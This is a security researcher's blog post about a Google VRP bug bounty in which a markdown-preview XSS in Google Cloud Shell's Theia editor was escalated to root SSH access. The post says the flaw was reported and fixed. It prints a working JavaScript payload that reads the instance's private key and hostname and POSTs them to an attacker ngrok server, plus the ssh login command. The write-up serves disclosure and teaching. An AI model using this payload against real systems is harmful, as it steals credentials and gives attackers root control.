@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" media="print" onload="this.onload=null;this.media='all';" id="ao_optimized_gfonts" href="https://fonts.googleapis.com/css?family=Oswald%3A400%2C300%2C700%7CAlegreya+Sans%3A400%2C400italic%2C700%2C700italic%7CDosis%3Ainherit%2C400&#038;subset=latin%2Clatin-ext&amp;display=swap">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="/xmlrpc.php">
+<meta name="theme-color" content="#1a1a1a">
+<link media="all" href="/wp-content/cache/autoptimize/css/autoptimize_3b05b7efe97d6722f572c298a31dfe97.css" rel="stylesheet">
+<title>WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) &#8211; $5,000 USD &#8211; @omespino</title>
+<meta name="robots" content="max-image-preview:large">
+<link rel="dns-prefetch" href="//www.googletagmanager.com">
+<link href="https://fonts.gstatic.com/" crossorigin="anonymous" rel="preconnect">
+<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="@omespino &raquo; WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) &#8211; $5,000 USD Comments Feed" href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/feed/">
+<link rel="stylesheet" id="mm-compiled-options-mobmenu-css" href="/wp-content/cache/autoptimize/css/autoptimize_single_20b3cf9d88dd6d90b4e4a9a904cb8741.css" type="text/css" media="all"> <script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>  <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=UA-47561535-2" id="google_gtagjs-js" async></script> <link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" type="application/json" href="/wp-json/wp/v2/posts/664">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml">
+<meta name="generator" content="WordPress 5.9.3">
+<link rel="canonical" href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/">
+<link rel="shortlink" href="/?p=664">
+<link rel="alternate" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fwrite-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd%2F">
+<link rel="alternate" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2Fwrite-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd%2F&#038;format=xml">
+<meta name="generator" content="Site Kit by Google 1.72.0"> <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1119974224835012&ev=PageView&noscript=1"></noscript>
+<link rel="icon" href="/wp-content/uploads/2020/12/cropped-dddd-32x32.png" sizes="32x32">
+<link rel="icon" href="/wp-content/uploads/2020/12/cropped-dddd-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="/wp-content/uploads/2020/12/cropped-dddd-180x180.png">
+<meta name="msapplication-TileImage" content="/wp-content/uploads/2020/12/cropped-dddd-270x270.png"> <script src="/wp-content/cache/autoptimize/js/autoptimize_eafcdd70e0cf994d53c6a65b41022ac5.js"></script>
+</head>
+<body class="post-template-default single single-post postid-664 single-format-standard custom-background mob-menu-slideout-over">
+<div id="page" class="hfeed site"> <a class="skip-link screen-reader-text" href="#content">Skip to content</a><header id="masthead" class="site-header" role="banner"><div class="navigation-wrapper"><nav id="site-navigation" class="main-navigation" role="navigation"> <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Menu</button><div class="menu-menu-espanol-container"><ul id="menu-menu-espanol" class="menu"><li id="menu-item-1304" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1304"><a href="/es">BLOG EN ESPAÑOL</a></li></ul></div></nav></div>
+<div class="site-branding">
+<h1 class="site-title"><a href="/" rel="home">@omespino</a></h1>
+<h2 class="site-description">just another security blog.</h2>
+</div></header><div id="content" class="site-content"><div id="primary" class="content-area"><main id="main" class="site-main" role="main"><article id="post-664" class="post-664 post type-post status-publish format-standard hentry category-uncategorized-en"><header class="entry-header"><div class="entry-meta"> <span class="byline"> Written by <span class="author vcard"><a class="url fn n" href="/author/user-admin/">omespino</a></span></span><span class="posted-on"><a href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/" rel="bookmark"><time class="entry-date published" datetime="2020-10-01T17:50:24-07:00">October 1, 2020</time><time class="updated" datetime="2022-01-07T16:58:56-07:00">January 7, 2022</time></a></span>
+</div>
+<h1 class="entry-title">WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) &#8211; $5,000 USD</h1></header><div class="entry-wrapper">
+<div class="entry-content">
+<p><strong>[ Update: this writeup was modified to participate in<a href="https://security.googleblog.com/2020/03/announcing-our-first-gcp-vrp-prize.html" data-type="URL" data-id="https://security.googleblog.com/2020/03/announcing-our-first-gcp-vrp-prize.html"> GCP VRP Prize 2020 Awards</a> ]</strong></p>
+<div class="wp-block-image"><figure class="aligncenter size-medium"><a href="https://g.co/vrp" target="_blank" rel="noopener"><img style="height: 300px; width: auto" src="/wp-content/uploads/2021/04/vrp-hd.png" alt="" class="wp-image-758"></a></figure></div>
+<p><br><strong>Introduction:</strong><br><br>Hi everyone It’s been a while since my last post (1 year w00t!) but I’m back, I want to tell you a short story about one of my last bug bounties, and how I escalated a simple XSS to a full Google Cloud Shell instance take over as a full administrator (RCE as root)<br><br></p>
+<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="/bug-bounty-writeups-collection/" target="_blank" rel="noopener"><img loading="lazy" src="/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png" alt="" class="wp-image-1854" width="398" height="301"></a></figure></div>
+<p><strong>What is Google Cloud Shell?</strong> extracted from <a href="https://cloud.google.com/shell">Google Cloud shell landing page:</a></p>
+<p>&#8220;<em>Your online development and operations environment<br>Cloud Shell is an online development and operations environment accessible anywhere with your browser. You can manage your resources with its online terminal preloaded with utilities such as the gcloud command-line tool, kubectl, and more. You can also develop, build, debug, and deploy your cloud-native</em> apps using the online&nbsp;Cloud Shell Editor.&#8221; which  actually is an Eclipse Theia editor instance<br><br>So Google Cloud Shell basically is a<strong> Linux VM box </strong>with an online editor <strong>Eclipse Theia</strong>, so <strong>what is Ecplise Theia? </strong>extracted from <a href="https://theia-ide.org/" data-type="URL" data-id="https://theia-ide.org/">Theia landing page</a><br><br><em>&#8220;Eclipse Theia is an extensible platform to develop multi-language Cloud &amp; Desktop IDEs with state-of-the-art web technologies. &#8220;</em></p>
+<div class="wp-block-image"><figure class="aligncenter"><img src="https://theia-ide.org/theia-screenshot.jpg" alt="Theia IDE Screenshot"></figure></div>
+<p>So since Theia is Open Source, <a href="https://github.com/eclipse-theia/theia">Theia&#8217;s GitHub repository</a> is a very good place to start investigating</p>
+<p><strong>Investigation:</strong></p>
+<p>So the plan was basically:<br><br>Look into <a href="https://github.com/eclipse-theia/theia">Theia&#8217;s GitHub repository</a> issues and filter those with a <strong>security tag, </strong>then analyze all issues. <br><br> <b>It was my lucky day</b>, an XSS on markdown preview apparently reported by a Googler, and also a working POC, w00t?!</p>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="872" src="/wp-content/uploads/2020/11/image-1024x872.png" alt="" class="wp-image-707" srcset="/wp-content/uploads/2020/11/image-1024x872.png 1024w, /wp-content/uploads/2020/11/image-600x511.png 600w, /wp-content/uploads/2020/11/image-300x255.png 300w, /wp-content/uploads/2020/11/image-768x654.png 768w, /wp-content/uploads/2020/11/image-1536x1308.png 1536w, /wp-content/uploads/2020/11/image-1250x1064.png 1250w, /wp-content/uploads/2020/11/image-200x170.png 200w, /wp-content/uploads/2020/11/image.png 1858w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="783" src="/wp-content/uploads/2020/11/image-2-1024x783.png" alt="" class="wp-image-710" srcset="/wp-content/uploads/2020/11/image-2-1024x783.png 1024w, /wp-content/uploads/2020/11/image-2-600x459.png 600w, /wp-content/uploads/2020/11/image-2-300x229.png 300w, /wp-content/uploads/2020/11/image-2-768x587.png 768w, /wp-content/uploads/2020/11/image-2-1536x1174.png 1536w, /wp-content/uploads/2020/11/image-2-1250x956.png 1250w, /wp-content/uploads/2020/11/image-2-200x153.png 200w, /wp-content/uploads/2020/11/image-2.png 1800w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>
+<p>After that immediately I tested that POC on <a href="https://shell.cloud.google.com/">https://shell.cloud.google.com/</a> and it worked like a charm!!</p>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="187" src="/wp-content/uploads/2020/11/image-3-1024x187.png" alt="" class="wp-image-715" srcset="/wp-content/uploads/2020/11/image-3-1024x187.png 1024w, /wp-content/uploads/2020/11/image-3-600x109.png 600w, /wp-content/uploads/2020/11/image-3-300x55.png 300w, /wp-content/uploads/2020/11/image-3-768x140.png 768w, /wp-content/uploads/2020/11/image-3-1536x280.png 1536w, /wp-content/uploads/2020/11/image-3-2048x374.png 2048w, /wp-content/uploads/2020/11/image-3-1250x228.png 1250w, /wp-content/uploads/2020/11/image-3-200x36.png 200w, /wp-content/uploads/2020/11/image-3.png 1980w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>
+<p>So, at this point, Google would reward the alert(0) box, <strong>they do not need you to explain to them why XSS is a big deal as other companies, right?</strong> Anyway I wanted to push myself to escalate this XSS to full instance take over, so was time to escalate this simple alert box.<br><br><strong>Escalation:<br><br></strong>So, my first taught was that if the XSS was able to run in the same context that all files, maybe I can run a simple GET to extract any &#8220;local&#8221; file, but it was not that easy, also that I noticed that the UI Theia editor part for the editor was running in some instance that is different for the actual &#8220;command line terminal&#8221; instance <br><br>So luckily the UI Theia instance has the private key in the root of the instance, and we just needed to navigate to a new workspace and set / (root) to see that key, anyway sadly there is no screenshot for that, but you have my word, once loaded the workspace &#8220;/&#8221; you can see that &#8220;id_cloudshell&#8221; file</p>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="844" src="/wp-content/uploads/2020/11/image-4-1024x844.png" alt="" class="wp-image-720" srcset="/wp-content/uploads/2020/11/image-4-1024x844.png 1024w, /wp-content/uploads/2020/11/image-4-600x495.png 600w, /wp-content/uploads/2020/11/image-4-300x247.png 300w, /wp-content/uploads/2020/11/image-4-768x633.png 768w, /wp-content/uploads/2020/11/image-4-200x165.png 200w, /wp-content/uploads/2020/11/image-4.png 1072w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>
+<p> <br>So in the end, after some playing with the &#8220;Download&#8221; files button and checking all the traffic in Chrome DevTools, the solution for reading those files via HTTP GET on javascript was using these 2 endpoints:<br><br>1.- First, <b><strong>&#8216;https://&#8217; + location.host + &#8216;/files/?uri=&#8217;</strong></b><br>This to get the id for any uri, per example <em><b>/files/?uri=file:///etc/hosts</b></em>, responses something like<em> <b>{id: &#8220;5147084a-XXXX-43a9-afb0-bb8a126f1162&#8221;}</b> </em><br><br>2.- And then use <strong>https://&#8217; + location.host + &#8216;/files/download/?id=&#8217; </strong>with the id<em> <b>/files/download/?id=5147084a-<em>XXXX</em>-43a9-afb0-bb8a126f1162</b></em> and getting the actual file content <br></p>
+<p><strong>Putting all together :</strong><br><br>Google Cloud Shell has an option to import GitHub repositories into Google Cloud shell instances<a href="https://cloud.google.com/shell/docs/open-in-cloud-shell"> with 1 click</a>, so the main idea was:<br><br>1.- Create a <a href="https://github.com/omespino/gcs_instace_takeover/blob/master/readme.md" data-type="URL" data-id="https://github.com/omespino/gcs_instace_takeover/blob/master/readme.md">malicious git repository</a> to store that malicious script in the read.md file<br><br>2.- We can also put the open in google cloud shell button in the same file md file</p>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="903" src="/wp-content/uploads/2020/11/image-5-1024x903.png" alt="" class="wp-image-736" srcset="/wp-content/uploads/2020/11/image-5-1024x903.png 1024w, /wp-content/uploads/2020/11/image-5-600x529.png 600w, /wp-content/uploads/2020/11/image-5-300x265.png 300w, /wp-content/uploads/2020/11/image-5-768x677.png 768w, /wp-content/uploads/2020/11/image-5-200x176.png 200w, /wp-content/uploads/2020/11/image-5.png 1032w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>
+<p><br>3.- Then trick the user to import that git repository to his google cloud shell instance <br><br>4.- Once the read.md file renders we stole the <strong>/etc/hosts</strong> file to construct the public domain to access that cloudshell instance and also the private key <strong>/../id_cloudshell</strong><br><br><em>the hostname is <strong>&#8220;cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX&#8221;</strong>, we delete the cs-6000 part and append .cloudshell.dev, getting something like this <strong>devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev</strong></em> that is public accessible for anyone<br><br>5.- Since we know that the <strong>root</strong> user is always present user in Linux we can use that to login in via ssh<br><br>6.- with <em><strong>devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev</strong></em> (public domain) we can actually get the IP from <em><strong>devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev</strong></em> making a ping and then do some port scanning, (after that we discovered that the ssh service was running on<strong> 6000 port </strong>)<br><br>7.- Profit, knowing the public domain hostname, the ssh port, the user root, and the private key we just needed to login in and run any command that we want<br><em><strong>‘ssh -i id_cloudshell -p 6000&nbsp;root@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev‘</strong></em><br><br>Final read.me file code <br></p>
+<div class="wp-block-image"><figure class="aligncenter size-large"><img src="/wp-content/uploads/2020/12/read.me_file.jpg" alt="" class="wp-image-752"></figure></div>
+<pre class="wp-block-code"><code># Google VRP testing  
+Google cloudshell instance take over (as root)
+
+&#91;!&#91;Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&amp;cloudshell_git_repo=https:%2F%2Fgithub.com%2Fomespino%2Fgcs_instace_takeover.git&amp;cloudshell_open_in_editor=readme.md)
+
+## Getting Started 
+just need to preview this file to see the magic 
+&lt;style onload="{ 
+	var file_results = &#91;] 
+	// this scape the container and get the ssh id_cloudshell private key 
+	read_file('file:///../id_cloudshell') 
+	// getting the hostname (external connection) 
+	read_file('file:///etc/hostname') setTimeout(function(){ send_files(file_results) },5000) 
+	// function to read any file given the path with 
+        // file protocol per example 'file:///etc/hostname' 
+	function read_file(file_to_read){ 
+		var container_url = 'https://' + location.host + '/files/?uri=' 
+		var get_file_id_url = container_url + file_to_read console.log(get_file_id_url) 
+		fetch(get_file_id_url) // convert response to json
+			 .then(response =&gt; { 
+			 	return response.json() 
+			 }).then(json =&gt; { 
+			 	var container_download_url = 
+                                  'https://' + location.host + '/files/download/?id=' 
+			 	var download_url = 
+                                  container_download_url + json.id fetch(download_url)
+			 	.then(response =&gt; { return response.text() } 
+			 	.then(text =&gt; { 
+			 		console.log(file_to_read + ' '+ text) 
+			 		file_results.push(file_to_read + ' ' + text)})
+			 	}) 
+			} 
+
+		function send_files(result){ 
+		// need to set netcat to listen per example nc -lvvv 55555 
+                let attacker_server = ' https://56051573.ngrok.io' 
+		fetch(attacker_server, { 
+			method: 'post', body: JSON.stringify(result) 
+		}) 
+	} 
+}"&gt;
+</code></pre>
+<p><br><strong>Extracted from Google VRP&#8217;s report: (the actual Google VRP report) </strong></p>
+<p><em>Summary: Google cloud shell instance take over (as root)</em></p>
+<p>Steps to reproduce:</p>
+<p><em>1.- Setup an SSL server that you own in any port, I will use ngrok + nc combo over port 55555</em></p>
+<p><em>2.- Visit&nbsp;<a rel="noreferrer noopener" href="https://www.google.com/url?q=https://github.com/omespino/gcs_instace_takeover&amp;sa=D&amp;usg=AFQjCNG_9gmSNcYeUI0c00qkuBJJKzansA" target="_blank">https://github.com/omespino/gcs_instace_takeover</a>&nbsp;and click open in Google Cloud Shell</em></p>
+<p><em>3.- Wait to load everything and then click the preview button for the .md files (you need to set up the attacker server that you own before de preview)</em></p>
+<p><em>4.- Receive 2 google vm&#8217;s files: &#8216;/etc/hosts&#8217; and the private key &#8216;../id_cloudshell&#8217; (scape the container with &#8216;../&#8217; )<br>&nbsp; &nbsp; &nbsp; &nbsp; 4.1: for the private key you need to replace \n for jump lines and save it as &#8216;id_cloudshell&#8217;<br>&nbsp; &nbsp; &nbsp; &nbsp; 4.2: the hostname is &#8220;cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX&#8221;, we delete the cs-6000 part and append .<a rel="noreferrer noopener" href="https://www.google.com/url?q=http://cloudshell.dev&amp;sa=D&amp;usg=AFQjCNF1BD8WAg1OhhHdNMHkYZnWnCusHA" target="_blank">cloudshell.dev</a>, getting something like this&nbsp;<a rel="noreferrer noopener" href="https://www.google.com/url?q=http://devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev&amp;sa=D&amp;usg=AFQjCNFvjxzIqtt525l-TtFOTXQFe2PWig" target="_blank">devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev</a></em></p>
+<p><em>5.- login as root on ssh over port 6000<br>&nbsp; &nbsp; &nbsp; &nbsp; &#8216;ssh -i id_cloudshell -p 6000&nbsp;<a rel="noreferrer noopener" href="mailto:root@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev" target="_blank">root@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev</a>&#8216;</em></p>
+<p><em>6.- w00t!!! now you are r00t! on that google cloudshell instance</em></p> <iframe loading="lazy" id="player" type="text/html" width="1024" height="390" src="https://www.youtube.com/embed/KFzShR2PvvI" frameborder="0"></iframe><p><br><br>Feb 6, 2020: Sent the report to Google VRP<br>Feb 6, 2020: Got a message from google that the bug was triaged<br>Feb 14, 2020: Nice Catch! Bug Accepted (P2) <br>Feb 20, 2020: $5,000 bounty awarded <br>Mar 18, 2020: Fixed by Google <br><br>Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter&nbsp;<a href="https://twitter.com/omespino">@omespino</a>, read you later.</p>
+<div class="shared-counts-wrap after_content style-fancy">
+<a href="https://www.facebook.com/sharer/sharer.php?u=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/&amp;display=popup&amp;ref=plugin&amp;src=share_button" title="Share on Facebook" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button facebook shared-counts-no-count" data-postid="664" data-social-network="Facebook" data-social-action="Share" data-social-target="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18.8125" height="32" viewbox="0 0 602 1024"><path d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z"></path></svg></span><span class="shared-counts-label">Facebook</span></span></a><a href="https://twitter.com/share?url=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/&amp;text=WRITE%20UP%20%E2%80%93%20%5BGoogle%20VRP%20Prize%20update%5D%20GOOGLE%20BUG%20BOUNTY%3A%20XSS%20to%20Cloud%20Shell%20instance%20takeover%20%28RCE%20as%20root%29%20%E2%80%93%20%245%2C000%20USD" title="Share on Twitter" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button twitter shared-counts-no-count" data-postid="664" data-social-network="Twitter" data-social-action="Tweet" data-social-target="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="29.71875" height="32" viewbox="0 0 951 1024"><path d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z"></path></svg></span><span class="shared-counts-label">Tweet</span></span></a><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/" title="Share on LinkedIn" target="_blank" rel="nofollow noopener noreferrer" class="shared-counts-button linkedin shared-counts-no-count" data-postid="664" data-social-network="LinkedIn" data-social-action="Share" data-social-target="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="27.4375" height="32" viewbox="0 0 878 1024"><path d="M199.429 357.143v566.286h-188.571v-566.286h188.571zM211.429 182.286q0.571 41.714-28.857 69.714t-77.429 28h-1.143q-46.857 0-75.429-28t-28.571-69.714q0-42.286 29.429-70t76.857-27.714 76 27.714 29.143 70zM877.714 598.857v324.571h-188v-302.857q0-60-23.143-94t-72.286-34q-36 0-60.286 19.714t-36.286 48.857q-6.286 17.143-6.286 46.286v316h-188q1.143-228 1.143-369.714t-0.571-169.143l-0.571-27.429h188v82.286h-1.143q11.429-18.286 23.429-32t32.286-29.714 49.714-24.857 65.429-8.857q97.714 0 157.143 64.857t59.429 190z"></path></svg></span><span class="shared-counts-label">LinkedIn</span></span></a><span class="shared-counts-button included_total" data-postid="664" data-social-target="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/"><span class="shared-counts-icon-label"><span class="shared-counts-icon"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="27.4375" height="32" viewbox="0 0 878 1024"><path d="M694.857 585.143q76 0 129.429 53.429t53.429 129.429-53.429 129.429-129.429 53.429-129.429-53.429-53.429-129.429q0-6.857 1.143-19.429l-205.714-102.857q-52.571 49.143-124.571 49.143-76 0-129.429-53.429t-53.429-129.429 53.429-129.429 129.429-53.429q72 0 124.571 49.143l205.714-102.857q-1.143-12.571-1.143-19.429 0-76 53.429-129.429t129.429-53.429 129.429 53.429 53.429 129.429-53.429 129.429-129.429 53.429q-72 0-124.571-49.143l-205.714 102.857q1.143 12.571 1.143 19.429t-1.143 19.429l205.714 102.857q52.571-49.143 124.571-49.143z"></path></svg></span><span class="shared-counts-label">Shares</span></span><span class="shared-counts-count">176</span></span>
+</div>
+</div>
+<footer class="entry-footer"></footer><div id="comments" class="comments-area">
+<h2 class="comments-title"> 2 thoughts on &ldquo;<span>WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) &#8211; $5,000 USD</span>&rdquo;</h2>
+<ol class="comment-list">
+<li id="comment-6772" class="comment even thread-even depth-1"><article id="div-comment-6772" class="comment-body"><footer class="comment-meta"><div class="comment-author vcard"> <img alt="" src="https://secure.gravatar.com/avatar/?s=75&#038;d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&#038;r=g" srcset="https://secure.gravatar.com/avatar/?s=150&#038;d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&#038;r=g 2x" class="avatar avatar-75 photo avatar-default" height="75" width="75" loading="lazy"> <b class="fn">sikis izle</b> <span class="says">says:</span>
+</div>
+<div class="comment-metadata"> <a href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#comment-6772"><time datetime="2020-11-13T13:04:33-07:00">November 13, 2020 at 1:04 pm</time></a>
+</div></footer><div class="comment-content"><p>I blog often and I seriously thank you for your content. Jesse Reuben Ediva</p></div>
+<div class="reply"><a rel="nofollow" class="comment-reply-link" href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/?replytocom=6772#respond" data-commentid="6772" data-postid="664" data-belowelement="div-comment-6772" data-respondelement="respond" data-replyto="Reply to sikis izle" aria-label="Reply to sikis izle">Reply</a></div></article></li>
+<li id="comment-6814" class="comment odd alt thread-odd thread-alt depth-1"><article id="div-comment-6814" class="comment-body"><footer class="comment-meta"><div class="comment-author vcard"> <img alt="" src="https://secure.gravatar.com/avatar/?s=75&#038;d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&#038;r=g" srcset="https://secure.gravatar.com/avatar/?s=150&#038;d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&#038;r=g 2x" class="avatar avatar-75 photo avatar-default" height="75" width="75" loading="lazy"> <b class="fn">film</b> <span class="says">says:</span>
+</div>
+<div class="comment-metadata"> <a href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#comment-6814"><time datetime="2020-11-22T20:08:02-07:00">November 22, 2020 at 8:08 pm</time></a>
+</div></footer><div class="comment-content"><p>Absolutely composed written content , thanks for information</p></div>
+<div class="reply"><a rel="nofollow" class="comment-reply-link" href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/?replytocom=6814#respond" data-commentid="6814" data-postid="664" data-belowelement="div-comment-6814" data-respondelement="respond" data-replyto="Reply to film" aria-label="Reply to film">Reply</a></div></article></li>
+</ol>
+<div id="respond" class="comment-respond">
+<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#respond" style="display:none;">Cancel reply</a></small>
+</h3>
+<form action="/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
+<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message" aria-hidden="true">Required fields are marked <span class="required" aria-hidden="true">*</span></span></p>
+<p class="comment-form-comment"><label for="comment">Comment <span class="required" aria-hidden="true">*</span></label><textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p>
+<p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245"></p>
+<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes"></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200"></p> <input type="text" name="leLQY" value="" style="display: none !important;"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="664" id="comment_post_ID"> <input type="hidden" name="comment_parent" id="comment_parent" value="0"></p>
+</form>
+</div>
+</div>
+</div>
+<div class="sidebar"></div></article><nav class="navigation post-navigation" aria-label="Posts"><h2 class="screen-reader-text">Post navigation</h2>
+<div class="nav-links">
+<div class="nav-previous"><a href="/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/" rel="prev">Previous Post <span class="screen-reader-text">WRITE UP – Private bug bounty $$,$$$ USD: &#8220;RCE as root on Marathon-Mesos instance&#8221;</span></a></div>
+<div class="nav-next"><a href="/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/" rel="next">Next Post <span class="screen-reader-text">WRITE UP: Google VRP N/A &#8211; Sandboxed RCE as root on Apigee API proxies</span></a></div>
+</div></nav></main></div></div>
+<footer id="colophon" class="site-footer" role="contentinfo"><div class="site-info"></div></footer>
+</div>
+<div class="mobmenu-overlay"></div>
+<div class="mob-menu-header-holder mobmenu" data-menu-display="mob-menu-slideout-over" data-open-icon="down-open" data-close-icon="up-open">
+<div class="mobmenul-container"><a href="#" class="mobmenu-left-bt mobmenu-trigger-action" data-panel-target="mobmenu-left-panel" aria-label="Left Menu Button"><i class="mob-icon-menu mob-menu-icon"></i><i class="mob-icon-cancel-1 mob-cancel-button"></i></a></div>
+<div class="mob-menu-logo-holder"><a href="/" class="headertext"><span>@OMESPINO</span></a></div>
+<div class="mobmenur-container"></div>
+</div>
